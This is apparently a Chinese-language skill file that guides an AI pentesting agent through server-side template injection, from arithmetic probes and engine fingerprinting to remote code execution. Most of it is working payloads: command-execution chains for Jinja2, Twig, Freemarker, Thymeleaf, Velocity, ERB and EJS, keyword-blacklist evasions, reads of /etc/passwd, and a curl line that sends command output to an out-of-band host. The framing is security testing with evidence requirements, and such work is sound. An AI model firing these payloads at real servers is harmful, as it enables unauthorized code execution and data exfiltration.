---
name: ssti-testing
description: 服务端模板注入（SSTI）的识别、引擎判别、沙箱绕过与 RCE。在参数被渲染进页面/邮件/PDF/报表、或输入原样回显成计算结果时使用。
version: 1.0.0
---

# SSTI 服务端模板注入测试

SSTI 的回报极高（多数直达 RCE），但极易误判：字符串回显不等于模板求值，模板求值不等于可执行任意表达式。本技能按「证明求值 → 判别引擎 → 摸沙箱 → 取执行」四段推进，每一段都要留下可复现证据。

## 1. 证明"真的被求值"

注入点常见于：URL 参数回显、用户名/昵称、搜索关键字、邮件模板、报表/PDF 生成、错误页、i18n 文案、文件名/路径。

最轻的探针（先只用算术，别一上来就上 payload）：

| 探针 | 期望（被求值） | 说明 |
| --- | --- | --- |
| `{{7*7}}` | `49` | Jinja2 / Twig / Nunjucks / 多数 `{{}}` 引擎 |
| `${7*7}` | `49` | Freemarker / JSP EL / Thymeleaf 内联 / Mako |
| `#{7*7}` | `49` | Ruby ERB 方言 / 部分 JSP EL |
| `<%= 7*7 %>` | `49` | ERB / EJS / ASP |
| `{{7*'7'}}` | Jinja2→`7777777`，Twig→`49` | **同时区分 Jinja2 与 Twig 的关键一步** |
| `${{7*7}}` | `49` | 绕过只过滤 `${}` 的 WAF（JS 模板/Groovy 系） |
| `@{7*7}` / `*{7*7}` | `49` | Thymeleaf（Spring 视图）/ 部分 Spring EL |
| `{{7*7}}` 原样回显 | 未求值 | 可能是静态回显 → 换上下文字符（`<% %>` / `#{}`），或该点是纯拼接 |

判定纪律：
- **只回显 `{{7*7}}` 不算洞**。必须看到 `49` 这种"输入被当成表达式执行"的证据。
- 一次失败不代表没有 SSTI：换定界符、换语义（`{{7*'7'}}`）、把 payload 放进 header/Cookie/文件名/JSON 字段（有些引擎只渲染模板上下文里的特定键）。
- 用 `record_fact` 记「该点未求值」这类否定结论时，标 `confidence=inferred`，并写明试过哪些定界符。

## 2. 判别引擎（决定后续所有 payload）

```
{{7*7}} → 49 ?
├─ 是 → {{7*'7'}} → 7777777 ? → Jinja2（Python）
│                  → 49 ?      → Twig（PHP，Twig 3 需注意 sandbox）
└─ 否 → ${7*7} → 49 ? → Freemarker / JSP EL / Thymeleaf
        #{7*7} → 49 ? → Ruby / EL
        <%= %> → 49 ? → ERB / EJS
```

补充指纹：
- Jinja2：`{{ config }}`（Flask）、`{{ self.__class__.__name__ }}`
- Twig：`{{ _self }}`、`{{ app.request }}`（Symfony）
- Freemarker：`${"freemarker.template.utility.Execute"?new()("id")}`
- Velocity：`#set($x=7*7)$x`

## 3. 沙箱与过滤绕过

**Jinja2（无沙箱）**——经典链：

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__["os"].popen("id").read() }}
{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}     ← 找 subprocess.Popen 下标后 __init__.__globals__['sys'].modules['os'].popen
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}   ← Flask
```

绕过常见关键词黑名单（`_`、`.`、`[]`、`os`、`class`）：

```
{{ ''["\x5f\x5fclass\x5f\x5f"] }}                      十六进制转义属性名
{{ ''|attr('__class__') }}                              用 attr 过滤器
{{ ''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1] }}
{{ ''.__class__.__mro__|last.__subclasses__()|selectattr('__name__','equalto','Popen')|first(...) }}
{{ joiner|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')() }}
```

**Jinja2（SandboxedEnvironment）**：`__globals__`/`__subclasses__` 被拦，转向：
- `{{ self.__init__.__globals__ }}`（看 self 是否漏出 globals）
- 模板内 `{% include '/etc/passwd' %}` 读文件
- `{{ config.__class__.__init__.__globals__ }}`（Flask 的 config 有时不受 sandbox 限制）

**Twig**：
```
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ ["id"]|filter("system") }}                    Twig 3 老版本
{{ "/etc/passwd"|file_excerpt(1,-1) }}           文件读
```
Twig 1.x/2.x 若开了 `registerUndefinedFilterCallback` 就有 `_self.env` 链；3.x 默认关。

**Freemarker**：
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign w= "freemarker.template.utility.ObjectConstructor"?new()>${w("java.lang.ProcessBuilder","id").start()}
```

**Thymeleaf（Spring）**——`__${...}__::` 预处理绕过输出转义：
```
${T(java.lang.Runtime).getRuntime().exec("id")}
[[${T(java.lang.Runtime).getRuntime().exec("id")}]]
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

**Velocity**：
```
#set($e="e")#set($x=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))
```

**ERB / EJS**：
```
<%= system('id') %>          ERB
<%= `id` %>                  ERB（反引号）
<%= require('child_process').execSync('id') %>    EJS
```

## 4. 从"能求值"走到"能证明 RCE"

- 命令回显：`id` / `uname -a` / `cat /etc/passwd`，把**真实输出**写进 finding 的 response 片段。
- 无回显时：`curl` 回连（`curl http://OAST/$(id|base64)`）、写文件到工作目录再读回（可行时）。
- 用 `report_finding` 时填 `reproduction`：入口点（完整 URL+方法+参数名）、前置（是否需要登录/角色）、每一步的真实请求与关键响应、provenance（从哪个事实推到这一步）。

## 5. 常见误判（务必自检）

| 现象 | 其实是什么 |
| --- | --- |
| 页面回显 `{{7*7}}` | 未求值，纯回显 |
| 回显 `49` 但只在页面标题里 | 可能是前端 JS 求值 → 那是 XSS，不是 SSTI |
| 报错里有模板语法 | 只证明语法被解析，未证明可执行表达式 |
| `{{7*7}}` 变成 `49` 后又塞了转义 HTML | 求值成立，但要确认输出上下文是否被 HTML 转义（影响后续 payload 编码） |

## 6. 与平台的配合

- 用 `http_request` 发结构化请求（自动走记录代理落库）；复现时用 `traffic_search` + `traffic_get` 回取原文，再用 `traffic_curl` 一键导出成可执行 curl。
- 一个回显位数有限制的点，先用 `{{7*7}}` 确认，再用 `{{cycler...}}` 取 `id`；不要跳步，否则报告里的复现链不成立。
